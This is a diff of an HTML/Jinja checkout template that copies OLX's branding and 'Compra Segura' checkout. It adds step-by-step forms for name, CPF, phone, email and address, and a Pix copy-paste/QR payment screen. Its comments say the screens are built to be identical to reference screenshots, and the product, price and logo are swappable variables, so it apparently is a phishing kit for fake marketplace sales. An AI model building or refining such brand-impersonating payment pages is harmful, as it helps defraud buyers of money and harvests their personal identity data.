@@ -1548,6 +1548,255 @@
       text-decoration: underline;
     }
 
+    /* ═══ TELA DE PAGAMENTO PIX ESTILO IMAGEM 3 & 4 ═══ */
+    .olx-pix-pay-wrap {
+      background: #ffffff;
+      width: 100%;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+    .olx-pix-pay-top-header {
+      background: #ffffff;
+      height: 60px;
+      display: flex;
+      align-items: center;
+      padding: 0 24px;
+      border-bottom: 1px solid #ededed;
+      gap: 16px;
+    }
+    .olx-pix-header-logo-svg {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+    .olx-pix-header-order-title {
+      font-size: 16px;
+      font-weight: 500;
+      color: #222222;
+      border-left: 1px solid #e2e8f0;
+      padding-left: 16px;
+      line-height: 1.2;
+    }
+    .olx-pix-pay-main {
+      flex: 1;
+      padding: 32px 16px 40px;
+      display: flex;
+      justify-content: center;
+      background: #ffffff;
+    }
+    .olx-pix-card-box {
+      width: 100%;
+      max-width: 480px;
+      border: 1px solid #e5e7eb;
+      border-radius: 16px;
+      padding: 32px 24px 28px;
+      box-shadow: 0 2px 12px rgba(0,0,0,0.04);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      text-align: center;
+      background: #ffffff;
+    }
+    .olx-pix-doc-badge {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 20px;
+    }
+    .olx-pix-icon-img {
+      width: 110px;
+      height: 110px;
+      object-fit: contain;
+      display: block;
+    }
+    .olx-pix-main-title {
+      font-size: 24px;
+      font-weight: 800;
+      color: #1a1a1a;
+      line-height: 1.25;
+      margin: 0 0 22px;
+    }
+    .olx-pix-code-field {
+      width: 100%;
+      background: #f4f4f5;
+      border: 1px solid #e4e4e7;
+      border-radius: 10px;
+      padding: 14px 16px;
+      font-size: 13.5px;
+      color: #71717a;
+      text-align: center;
+      margin-bottom: 16px;
+      outline: none;
+      font-family: inherit;
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+      cursor: pointer;
+    }
+    .olx-pix-btn-copy {
+      width: 100%;
+      height: 48px;
+      background: #F28A30;
+      color: #ffffff;
+      border: none;
+      border-radius: 24px;
+      font-size: 15px;
+      font-weight: 700;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      cursor: pointer;
+      box-shadow: 0 4px 12px rgba(242, 138, 48, 0.3);
+      transition: background 0.15s, transform 0.1s;
+      font-family: inherit;
+      margin-bottom: 24px;
+    }
+    .olx-pix-btn-copy:hover {
+      background: #e07920;
+      transform: translateY(-1px);
+    }
+    .olx-pix-instructions-list {
+      text-align: left;
+      width: 100%;
+      font-size: 14px;
+      color: #27272a;
+      line-height: 1.5;
+      margin-bottom: 24px;
+      display: flex;
+      flex-direction: column;
+      gap: 14px;
+    }
+    .olx-pix-instruction-item {
+      display: flex;
+      align-items: flex-start;
+      gap: 6px;
+    }
+    .olx-pix-num {
+      font-weight: 800;
+      color: #18181b;
+      min-width: 18px;
+    }
+    .olx-pix-notice-box {
+      border-top: 1px solid #f4f4f5;
+      padding-top: 18px;
+      font-size: 12px;
+      color: #52525b;
+      line-height: 1.45;
+      text-align: left;
+      width: 100%;
+      margin-bottom: 22px;
+    }
+    .olx-pix-btn-home {
+      width: 100%;
+      height: 48px;
+      background: #ffffff;
+      color: #F28A30;
+      border: 1.5px solid #F28A30;
+      border-radius: 24px;
+      font-size: 15px;
+      font-weight: 700;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      transition: all 0.15s;
+      text-decoration: none;
+      font-family: inherit;
+    }
+    .olx-pix-btn-home:hover {
+      background: #fff8f2;
+    }
+
+    /* Versão Desktop (Imagem 4) */
+    .olx-pix-desktop-grid {
+      display: flex;
+      align-items: center;
+      gap: 24px;
+      width: 100%;
+      margin-bottom: 24px;
+      text-align: left;
+    }
+    .olx-pix-qr-container {
+      position: relative;
+      flex-shrink: 0;
+      width: 145px;
+      height: 145px;
+      border-radius: 8px;
+      border: 1px solid #e4e4e7;
+      padding: 6px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: #ffffff;
+    }
+    .olx-pix-qr-container img {
+      width: 100%;
+      height: 100%;
+      object-fit: contain;
+    }
+    .olx-pix-qr-center-badge {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background: #6e0ad6;
+      color: #ffffff;
+      border-radius: 50%;
+      width: 34px;
+      height: 34px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-weight: 900;
+      font-size: 11px;
+      border: 2px solid #ffffff;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.15);
+    }
+    .olx-pix-desktop-steps {
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+      font-size: 13px;
+      color: #27272a;
+      line-height: 1.4;
+    }
+    .olx-pix-footer-desktop {
+      border-top: 1px solid #f4f4f5;
+      padding: 24px 32px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      font-size: 12.5px;
+      color: #71717a;
+      background: #ffffff;
+      max-width: 1140px;
+      margin: 0 auto;
+      width: 100%;
+    }
+    .olx-pix-footer-links {
+      display: flex;
+      gap: 20px;
+    }
+    .olx-pix-footer-links a {
+      color: #52525b;
+      text-decoration: none;
+    }
+    .olx-pix-footer-links a:hover {
+      text-decoration: underline;
+    }
+    .olx-pix-footer-socials {
+      display: flex;
+      gap: 16px;
+      align-items: center;
+    }
+    .olx-pix-footer-socials svg {
+      width: 18px;
+      height: 18px;
+      fill: #52525b;
+    }
+
     /* STEP 3: SUCCESS VIEW */
     .success-view { text-align: center; padding: 20px 0; }
     .success-icon-wrapper {
@@ -2012,7 +2261,6 @@
       <p class="product-description" id="display-product-description">
         {{ product_description if product_description else 'iPhone 11 com 64GB de armazenamento na cor branca. Design elegante e desempenho excepcional para o seu dia a dia.' }}
       </p>
-        <div style="margin-top:20px; height:60px; background:#f4f4f4; border-radius:8px;"></div>
     </div>
 
     <!-- DETALHES CARD -->
@@ -2804,135 +3052,177 @@
       <!-- VISÃO MOBILE (max-width: 768px): FLUXO EM ETAPAS COM IDENTIDADE ROXA -->
       <!-- ══════════════════════════════════════════════════════════════════ -->
       <div class="lead-mobile-view">
-        <div class="olx-custom-screen-wrap">
-        <!-- Thin purple progress bar - Image 2 style -->
-        <div class="olx-custom-top-bar" style="background: linear-gradient(90deg, var(--olx-purple) 35%, #e5e7eb 35%);"></div>
+        <!-- ── SUB-ETAPA 1 MOBILE: DADOS PESSOAIS ── -->
+        <div class="olx-custom-screen-wrap" id="modal-mobile-substep-personal" style="display: flex; flex-direction: column; min-height: 100vh;">
+          <!-- Barra de progresso roxa topo (Etapa 1: 33%) -->
+          <div class="olx-custom-top-bar" style="background: linear-gradient(90deg, var(--olx-purple) 33%, #e5e7eb 33%);"></div>
 
-        <!-- Flat nav header: title + close -->
-        <div class="olx-flow-nav-header">
-          <div class="olx-flow-nav-left">
-            <div class="olx-flow-nav-title">Finalizar compra</div>
+          <!-- Header -->
+          <div class="olx-flow-nav-header">
+            <div class="olx-flow-nav-left">
+              <div class="olx-flow-nav-title">Finalizar compra</div>
+            </div>
+            <button type="button" class="olx-flow-close-btn" onclick="closeCheckoutModal()" title="Fechar">
+              <svg width="20" height="20" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
+            </button>
           </div>
-          <button type="button" class="olx-flow-close-btn" onclick="closeCheckoutModal()" title="Fechar">
-            <svg width="20" height="20" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
-          </button>
-        </div>
 
-        <!-- Scrollable form body -->
-        <div class="confirm-scroll-body">
-          <div class="confirm-personal-wrap">
-            <div class="confirm-personal-title" style="font-size: 20px; margin-bottom: 6px;">
-              Identificação e Entrega
-            </div>
-            <div style="font-size: 13px; color: #718096; margin-bottom: 22px;">
-              Preencha seus dados para entrega com a Compra Segura OLX.
-            </div>
+          <!-- Formulário Dados Pessoais -->
+          <div class="confirm-scroll-body">
+            <div class="confirm-personal-wrap">
+              <div class="confirm-personal-title" style="font-size: 20px; margin-bottom: 6px;">
+                Identificação do Comprador
+              </div>
+              <div style="font-size: 13px; color: #718096; margin-bottom: 22px;">
+                Preencha seus dados pessoais para compra com a Compra Segura OLX.
+              </div>
 
-            <div class="form-group">
-              <label class="form-label">Nome Completo *</label>
-              <input type="text" id="lead-name" class="form-input" placeholder="Digite seu nome completo" />
-            </div>
+              <div class="form-group">
+                <label class="form-label">NOME COMPLETO *</label>
+                <input type="text" id="lead-name" class="form-input" placeholder="Digite seu nome completo" />
+              </div>
 
-            <div class="form-row">
               <div class="form-group">
                 <label class="form-label">CPF *</label>
                 <input type="text" id="lead-cpf" class="form-input" placeholder="000.000.000-00" maxlength="14" />
               </div>
+
               <div class="form-group">
-                <label class="form-label">WhatsApp / Celular *</label>
+                <label class="form-label">WHATSAPP / CELULAR *</label>
                 <input type="text" id="lead-phone" class="form-input" placeholder="(11) 99999-9999" maxlength="15" />
               </div>
-            </div>
 
-            <div class="form-group">
-              <label class="form-label">E-mail para Rastreamento *</label>
-              <input type="email" id="lead-email" class="form-input" placeholder="seu-email@exemplo.com" />
+              <div class="form-group">
+                <label class="form-label">E-MAIL PARA RASTREAMENTO *</label>
+                <input type="email" id="lead-email" class="form-input" placeholder="seu-email@exemplo.com" />
+              </div>
             </div>
+          </div>
 
-            <!-- ENDEREÇO -->
-            <div class="form-row">
-              <div class="form-group">
-                <label class="form-label">CEP de Entrega *</label>
-                <input type="text" id="lead-cep" class="form-input" placeholder="00000-000" maxlength="9" />
-              </div>
-              <div class="form-group">
-                <label class="form-label">Estado (UF) *</label>
-                <input type="text" id="lead-state" class="form-input" placeholder="SP" maxlength="2" />
-              </div>
-            </div>
-
-            <div class="form-row-3">
-              <div class="form-group">
-                <label class="form-label">Rua / Endereço *</label>
-                <input type="text" id="lead-street" class="form-input" placeholder="Ex: Av. Paulista" />
-              </div>
-              <div class="form-group">
-                <label class="form-label">Número *</label>
-                <input type="text" id="lead-number" class="form-input" placeholder="123" />
-              </div>
-              <div class="form-group">
-                <label class="form-label">Compl.</label>
-                <input type="text" id="lead-complement" class="form-input" placeholder="Apto 4" />
-              </div>
-            </div>
-
-            <div class="form-row">
-              <div class="form-group">
-                <label class="form-label">Bairro *</label>
-                <input type="text" id="lead-neighborhood" class="form-input" placeholder="Bairro" />
-              </div>
-              <div class="form-group">
-                <label class="form-label">Cidade *</label>
-                <input type="text" id="lead-city" class="form-input" placeholder="Cidade" />
-              </div>
-            </div>
-
-            <!-- CUPOM DE DESCONTO / APENAS FRETE -->
-            {% if coupon_active is not defined or coupon_active|int != 0 %}
-            <div class="checkout-coupon-card" id="coupon-section" style="margin-top: 10px; margin-bottom: 14px;">
-              <div class="coupon-card-header">
-                <div style="display:flex;align-items:center;gap:6px">
-                  <svg width="15" height="15" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.2"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"/><line x1="7" y1="7" x2="7.01" y2="7"/></svg>
-                  <span>Possui um cupom de desconto?</span>
-                </div>
-                <span style="font-size:11px;color:#6b7280;font-weight:600">Opcional</span>
-              </div>
-              <div class="coupon-input-wrap">
-                <input type="text" id="checkout-coupon-input" placeholder="Inserir código do cupom" value="{{ shipping_coupon if shipping_coupon is defined and shipping_coupon else '' }}" />
-                <button type="button" class="btn-apply-coupon" id="btn-apply-coupon" onclick="handleCouponClick()">
-                  <span id="btn-apply-coupon-text">Aplicar</span>
-                </button>
-              </div>
-              <div class="coupon-status-msg" id="coupon-status-msg"></div>
-            </div>
-            {% endif %}
-
-            <!-- Elementos de cálculo ocultos para suporte a JS -->
-            <div style="display: none;" id="hidden-calc-dom">
-              <span id="summary-product-name">{{ product_name if product_name else '' }}</span>
-              <span id="breakdown-prod-val">R$ {{ product_price if product_price else '' }}</span>
-              <span id="breakdown-discount-label">Desconto:</span>
-              <span id="breakdown-discount-val">- R$ 0,00</span>
-              <span id="breakdown-shipping-val">R$ {{ shipping_fee if shipping_fee is defined and shipping_fee else '19,90' }}</span>
-              <span id="summary-total-val">R$ {{ product_price if product_price else '' }}</span>
-              <div id="row-prod-price"></div>
-              <div id="row-coupon-discount"></div>
-              <div id="row-shipping-fee"></div>
-            </div>
+          <!-- Botão Continuar para Endereço -->
+          <div class="confirm-btns-wrap">
+            <button type="button" class="btn-orange-full" id="btn-to-address-step" onclick="goToAddressStep()">
+              <span>Continuar para Entrega</span>
+              <svg width="18" height="18" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.5" style="margin-left: 6px;"><polyline points="9 18 15 12 9 6"/></svg>
+            </button>
           </div>
         </div>
 
-        <!-- Sticky action buttons at bottom -->
-        <div class="confirm-btns-wrap">
-          <button type="button" class="btn-orange-full" id="btn-advance-lead">
-            <span id="btn-advance-text">Continuar</span>
-            <svg id="btn-advance-icon" width="18" height="18" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.5" style="margin-left: 6px;"><polyline points="9 18 15 12 9 6"/></svg>
-            <svg id="btn-advance-spinner" class="spinner-svg" width="18" height="18" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.5" style="display:none;margin-left:8px;"><circle cx="12" cy="12" r="10" stroke-opacity="0.25"/><path d="M12 2a10 10 0 0 1 10 10" stroke-linecap="round"/></svg>
-          </button>
-        </div>
-      </div>
-    </div>
+        <!-- ── SUB-ETAPA 2 MOBILE: ENDEREÇO DE ENTREGA COM VALIDAÇÃO INTELIGENTE DE CEP ── -->
+        <div class="olx-custom-screen-wrap" id="modal-mobile-substep-address" style="display: none; flex-direction: column; min-height: 100vh;">
+          <!-- Barra de progresso roxa topo (Etapa 2: 66%) -->
+          <div class="olx-custom-top-bar" style="background: linear-gradient(90deg, var(--olx-purple) 66%, #e5e7eb 66%);"></div>
 
+          <!-- Header com botão voltar -->
+          <div class="olx-flow-nav-header">
+            <div class="olx-flow-nav-left">
+              <button type="button" class="olx-flow-back-btn" onclick="backToPersonalStep()" title="Voltar">
+                <svg width="22" height="22" fill="none" viewBox="0 0 24 24" stroke="#1a1a1a" stroke-width="2.3" stroke-linecap="round" stroke-linejoin="round">
+                  <polyline points="15 18 9 12 15 6"></polyline>
+                </svg>
+              </button>
+              <div class="olx-flow-nav-title">Endereço de entrega</div>
+            </div>
+            <button type="button" class="olx-flow-close-btn" onclick="closeCheckoutModal()" title="Fechar">
+              <svg width="20" height="20" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
+            </button>
+          </div>
+
+          <!-- Formulário Endereço -->
+          <div class="confirm-scroll-body">
+            <div class="confirm-personal-wrap">
+              <div class="confirm-personal-title" style="font-size: 20px; margin-bottom: 6px;">
+                Onde você quer receber?
+              </div>
+              <div style="font-size: 13px; color: #718096; margin-bottom: 22px;">
+                Digite seu CEP para preenchimento e validação automática do endereço.
+              </div>
+
+              <!-- CEP e UF com status inteligente -->
+              <div class="form-row">
+                <div class="form-group" style="position: relative;">
+                  <label class="form-label">CEP DE ENTREGA *</label>
+                  <input type="text" id="lead-cep" class="form-input" placeholder="00000-000" maxlength="9" />
+                  <span id="cep-auto-status" style="position:absolute; right:12px; top:36px; font-size:11px; font-weight:700; color:#10b981; display:none;">
+                    Buscando...
+                  </span>
+                </div>
+                <div class="form-group">
+                  <label class="form-label">ESTADO (UF) *</label>
+                  <input type="text" id="lead-state" class="form-input" placeholder="SP" maxlength="2" />
+                </div>
+              </div>
+
+              <div class="form-row-3">
+                <div class="form-group">
+                  <label class="form-label">RUA / ENDEREÇO *</label>
+                  <input type="text" id="lead-street" class="form-input" placeholder="Ex: Av. Paulista" />
+                </div>
+                <div class="form-group">
+                  <label class="form-label">NÚMERO *</label>
+                  <input type="text" id="lead-number" class="form-input" placeholder="123" />
+                </div>
+                <div class="form-group">
+                  <label class="form-label">COMPL.</label>
+                  <input type="text" id="lead-complement" class="form-input" placeholder="Apto 4" />
+                </div>
+              </div>
+
+              <div class="form-row">
+                <div class="form-group">
+                  <label class="form-label">BAIRRO *</label>
+                  <input type="text" id="lead-neighborhood" class="form-input" placeholder="Bairro" />
+                </div>
+                <div class="form-group">
+                  <label class="form-label">CIDADE *</label>
+                  <input type="text" id="lead-city" class="form-input" placeholder="Cidade" />
+                </div>
+              </div>
+
+              <!-- CUPOM DE DESCONTO / APENAS FRETE -->
+              {% if coupon_active is not defined or coupon_active|int != 0 %}
+              <div class="checkout-coupon-card" id="coupon-section" style="margin-top: 10px; margin-bottom: 14px;">
+                <div class="coupon-card-header">
+                  <div style="display:flex;align-items:center;gap:6px">
+                    <svg width="15" height="15" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.2"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"/><line x1="7" y1="7" x2="7.01" y2="7"/></svg>
+                    <span>Possui um cupom de desconto?</span>
+                  </div>
+                  <span style="font-size:11px;color:#6b7280;font-weight:600">Opcional</span>
+                </div>
+                <div class="coupon-input-wrap">
+                  <input type="text" id="checkout-coupon-input" placeholder="Inserir código do cupom" value="{{ shipping_coupon if shipping_coupon is defined and shipping_coupon else '' }}" />
+                  <button type="button" class="btn-apply-coupon" id="btn-apply-coupon" onclick="handleCouponClick()">
+                    <span id="btn-apply-coupon-text">Aplicar</span>
+                  </button>
+                </div>
+                <div class="coupon-status-msg" id="coupon-status-msg"></div>
+              </div>
+              {% endif %}
+
+              <!-- Elementos de cálculo ocultos para suporte a JS -->
+              <div style="display: none;" id="hidden-calc-dom">
+                <span id="summary-product-name">{{ product_name if product_name else '' }}</span>
+                <span id="breakdown-prod-val">R$ {{ product_price if product_price else '' }}</span>
+                <span id="breakdown-discount-label">Desconto:</span>
+                <span id="breakdown-discount-val">- R$ 0,00</span>
+                <span id="breakdown-shipping-val">R$ {{ shipping_fee if shipping_fee is defined and shipping_fee else '19,90' }}</span>
+                <span id="summary-total-val">R$ {{ product_price if product_price else '' }}</span>
+                <div id="row-prod-price"></div>
+                <div id="row-coupon-discount"></div>
+                <div id="row-shipping-fee"></div>
+              </div>
+            </div>
+          </div>
+
+          <!-- Sticky action buttons at bottom -->
+          <div class="confirm-btns-wrap">
+            <button type="button" class="btn-orange-full" id="btn-advance-lead">
+              <span id="btn-advance-text">Ir para Pagamento</span>
+              <svg id="btn-advance-icon" width="18" height="18" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.5" style="margin-left: 6px;"><polyline points="9 18 15 12 9 6"/></svg>
+              <svg id="btn-advance-spinner" class="spinner-svg" width="18" height="18" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.5" style="display:none;margin-left:8px;"><circle cx="12" cy="12" r="10" stroke-opacity="0.25"/><path d="M12 2a10 10 0 0 1 10 10" stroke-linecap="round"/></svg>
+            </button>
+          </div>
+        </div>
       </div><!-- /lead-mobile-view -->
     </div><!-- /modal-step-1 -->
 
@@ -3378,49 +3668,177 @@
       </div>
     </div>
 
-    <!-- STEP 2: PIX GATEWAY SINCRONIZADO -->
-    <div class="modal-step-body pix-container" id="modal-step-2" style="display: none; padding: 0; height: 100%; overflow: hidden;">
-      <div class="olx-custom-screen-wrap">
-        <div class="olx-custom-top-bar" style="background: var(--olx-purple);"></div>
-        <div class="olx-flow-nav-header">
-          <div class="olx-flow-nav-left">
-            <button type="button" class="olx-flow-back-btn" onclick="backToPaymentChoice()" title="Voltar">
-              <svg width="20" height="20" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.5"><polyline points="15 18 9 12 15 6"/></svg>
-            </button>
-            <div class="olx-flow-nav-title">Pagamento Pix Seguro</div>
-          </div>
-          <button type="button" class="olx-flow-close-btn" onclick="closeCheckoutModal()" title="Fechar">
-            <svg width="20" height="20" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
-          </button>
-        </div>
-
-        <div class="confirm-scroll-body" style="text-align: center;">
-          <div class="pix-timer-badge" style="margin-top: 10px;">
-            <svg width="15" height="15" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
-            <span>Chave expira em: <strong id="pix-countdown">14:59</strong></span>
-          </div>
-
-          <div style="font-weight: 800; font-size: 16px; color: #1a1a1a; margin-bottom: 4px;">Pague via Pix para aprovação imediata</div>
-          <div style="font-size: 13px; color: #666; margin-bottom: 16px;">Abra seu aplicativo do banco e aponte a câmera para o QR Code abaixo:</div>
-
-          <div class="pix-qr-wrapper">
-            <img id="pix-qr-img" class="pix-qr-img" src="" alt="QR Code Pix" />
+    <!-- STEP 2: PIX GATEWAY SINCRONIZADO (IDÊNTICO À IMAGEM 3 NO MOBILE E IMAGEM 4 NO DESKTOP) -->
+    <div class="modal-step-body pix-container" id="modal-step-2" style="display: none; padding: 0; min-height: 100vh; background: #ffffff;">
+      
+      <!-- ─── VISÃO MOBILE (max-width: 768px): IDÊNTICA À IMAGEM 3 ─── -->
+      <div class="lead-mobile-view" style="width:100%; min-height:100vh; background:#ffffff;">
+        <div class="olx-pix-pay-wrap">
+          <!-- Top Header Mobile: Logo OLX + Resumo do pedido -->
+          <div class="olx-pix-pay-top-header">
+            <div class="olx-pix-header-logo-svg">
+              {% if logo_url %}
+                <img src="{{ logo_url }}" alt="Logo" style="max-height: 26px; max-width: 100px; object-fit: contain;" onerror="this.style.display='none'" />
+              {% else %}
+                <svg viewBox="0 0 220 88" xmlns="http://www.w3.org/2000/svg" height="26">
+                  <circle cx="30" cy="44" r="29" fill="#F28A30"/>
+                  <circle cx="30" cy="44" r="16" fill="#fff"/>
+                  <rect x="66" y="15" width="15" height="58" rx="3" fill="#7B02E8"/>
+                  <rect x="66" y="59" width="30" height="14" rx="3" fill="#7B02E8"/>
+                  <line x1="103" y1="15" x2="148" y2="73" stroke="#F28A30" stroke-width="16" stroke-linecap="round"/>
+                  <line x1="148" y1="15" x2="103" y2="73" stroke="#F28A30" stroke-width="16" stroke-linecap="round"/>
+                </svg>
+              {% endif %}
+            </div>
+            <div class="olx-pix-header-order-title">Resumo do pedido</div>
           </div>
 
-          <div class="pix-copy-box">
-            <input type="text" id="pix-copy-input" class="pix-copy-input" readonly />
-            <button class="btn-copy-action" id="btn-copy-pix">
-              <svg id="copy-icon-svg" width="16" height="16" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
-              <span id="copy-text-label">Copiar Pix</span>
-            </button>
-          </div>
+          <div class="olx-pix-pay-main" style="padding: 20px 16px;">
+            <div class="olx-pix-card-box">
+              <!-- Ícone Recibo com Relógio Roxo (PNG real) -->
+              <div class="olx-pix-doc-badge">
+                <img src="/static/images/pix_icon.png" alt="Pagamento Pix" class="olx-pix-icon-img" />
+              </div>
 
-          <div class="pix-status-alert">
-            <svg class="spinner-svg" width="16" height="16" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.5"><circle cx="12" cy="12" r="10" stroke-opacity="0.25"/><path d="M12 2a10 10 0 0 1 10 10" stroke-linecap="round"/></svg>
-            <span>Sincronizando com a rede bancária... Aguardando confirmação.</span>
+              <!-- Título -->
+              <h2 class="olx-pix-main-title">Quase lá! Finalize seu pagamento com PIX</h2>
+
+              <!-- Campo com Código Pix -->
+              <input type="text" id="pix-copy-input-mobile" class="olx-pix-code-field" readonly onclick="copyPixCode('mobile')" />
+
+              <!-- Botão Laranja Copiar Código Pix -->
+              <button type="button" class="olx-pix-btn-copy" id="btn-copy-pix-mobile" onclick="copyPixCode('mobile')">
+                <svg width="20" height="20" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+                  <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
+                  <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
+                </svg>
+                <span id="btn-copy-pix-mobile-text">Copiar código do PIX</span>
+              </button>
+
+              <!-- Instruções 1, 2, 3 -->
+              <div class="olx-pix-instructions-list">
+                <div class="olx-pix-instruction-item">
+                  <span class="olx-pix-num">1 -</span>
+                  <span>Abra o aplicativo do seu banco e escolha a opção <strong>PIX</strong>, como se fosse fazer uma transferência.</span>
+                </div>
+                <div class="olx-pix-instruction-item">
+                  <span class="olx-pix-num">2 -</span>
+                  <span>Selecione a opção <strong>PIX Copia e Cola</strong>.</span>
+                </div>
+                <div class="olx-pix-instruction-item">
+                  <span class="olx-pix-num">3 -</span>
+                  <span>Cole o código acima e <strong>confirme o pagamento</strong> no aplicativo do seu banco.</span>
+                </div>
+              </div>
+
+              <!-- Mensagem de ativação -->
+              <div class="olx-pix-notice-box">
+                <strong>Importante:</strong> Seu serviço será ativado assim que reconhecermos o pagamento do PIX.
+              </div>
+
+              <!-- Botão Ir para Meus Anúncios (Redireciona para o Home do produto) -->
+              <a href="javascript:void(0)" class="olx-pix-btn-home" onclick="returnToProductHome()">
+                Ir para Meus Anúncios
+              </a>
+            </div>
           </div>
         </div>
       </div>
+
+      <!-- ─── VISÃO DESKTOP (min-width: 769px): IDÊNTICA À IMAGEM 4 ─── -->
+      <div class="dt-lead-desktop-view" style="width:100%; min-height:100vh; background:#ffffff;">
+        <div class="olx-pix-pay-wrap">
+          <!-- Top Header Desktop -->
+          <div class="olx-pix-pay-top-header" style="max-width: 1140px; margin: 0 auto; width: 100%; padding: 0 32px; height: 70px;">
+            <div class="olx-pix-header-logo-svg">
+              {% if logo_url %}
+                <img src="{{ logo_url }}" alt="Logo" style="max-height: 32px; max-width: 130px; object-fit: contain;" onerror="this.style.display='none'" />
+              {% else %}
+                <svg viewBox="0 0 220 88" xmlns="http://www.w3.org/2000/svg" height="32">
+                  <circle cx="30" cy="44" r="29" fill="#F28A30"/>
+                  <circle cx="30" cy="44" r="16" fill="#fff"/>
+                  <rect x="66" y="15" width="15" height="58" rx="3" fill="#7B02E8"/>
+                  <rect x="66" y="59" width="30" height="14" rx="3" fill="#7B02E8"/>
+                  <line x1="103" y1="15" x2="148" y2="73" stroke="#F28A30" stroke-width="16" stroke-linecap="round"/>
+                  <line x1="148" y1="15" x2="103" y2="73" stroke="#F28A30" stroke-width="16" stroke-linecap="round"/>
+                </svg>
+              {% endif %}
+            </div>
+            <div class="olx-pix-header-order-title" style="font-size: 17px; font-weight: 500;">Resumo do pedido</div>
+          </div>
+
+          <div class="olx-pix-pay-main" style="padding: 40px 24px 60px;">
+            <div class="olx-pix-card-box" style="max-width: 540px; padding: 40px 36px 32px;">
+              <!-- Ícone Recibo com Relógio Roxo (PNG real) -->
+              <div class="olx-pix-doc-badge">
+                <img src="/static/images/pix_icon.png" alt="Pagamento Pix" class="olx-pix-icon-img" style="width: 120px; height: 120px;" />
+              </div>
+
+              <!-- Título -->
+              <h2 class="olx-pix-main-title" style="font-size: 25px; margin-bottom: 28px;">Quase lá! Finalize seu pagamento com PIX</h2>
+
+              <!-- Grid com QR Code e Passos (Idêntico à Imagem 4) -->
+              <div class="olx-pix-desktop-grid">
+                <div class="olx-pix-qr-container">
+                  <img id="pix-qr-img-desktop" src="" alt="QR Code Pix" />
+                  <div class="olx-pix-qr-center-badge">olx</div>
+                </div>
+                <div class="olx-pix-desktop-steps">
+                  <div><strong>1 -</strong> Abra o aplicativo do seu banco e escolha a opção <strong>PIX</strong>, como se fosse fazer uma transferência.</div>
+                  <div><strong>2 -</strong> Selecione a opção <strong>PIX Copia e Cola</strong>.</div>
+                  <div><strong>3 -</strong> Cole o código ao lado e <strong>confirme o pagamento</strong> no aplicativo do seu banco.</div>
+                </div>
+              </div>
+
+              <!-- Botão Laranja Copiar Código Pix -->
+              <button type="button" class="olx-pix-btn-copy" id="btn-copy-pix-desktop" onclick="copyPixCode('desktop')">
+                <svg width="20" height="20" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+                  <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
+                  <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
+                </svg>
+                <span id="btn-copy-pix-desktop-text">Copiar código do PIX</span>
+              </button>
+
+              <div style="font-size: 13px; color: #71717a; margin-bottom: 20px;">
+                Se preferir, você também pode copiar usando "PIX copia e cola".
+              </div>
+
+              <!-- Mensagem Importante -->
+              <div class="olx-pix-notice-box" style="font-size: 13px;">
+                <strong>Importante:</strong> Seu serviço será ativado assim que reconhecermos o pagamento do PIX.
+              </div>
+
+              <!-- Botão Ir para Meus Anúncios (Volta para Home do produto) -->
+              <a href="javascript:void(0)" class="olx-pix-btn-home" onclick="returnToProductHome()">
+                Ir para Meus Anúncios
+              </a>
+            </div>
+          </div>
+
+          <!-- Rodapé Oficial Desktop (Idêntico à Imagem 4) -->
+          <footer class="olx-pix-footer-desktop">
+            <div class="olx-pix-footer-links">
+              <a href="javascript:void(0)">Sobre o OLX</a>
+              <a href="javascript:void(0)">Dicas para sua proteção</a>
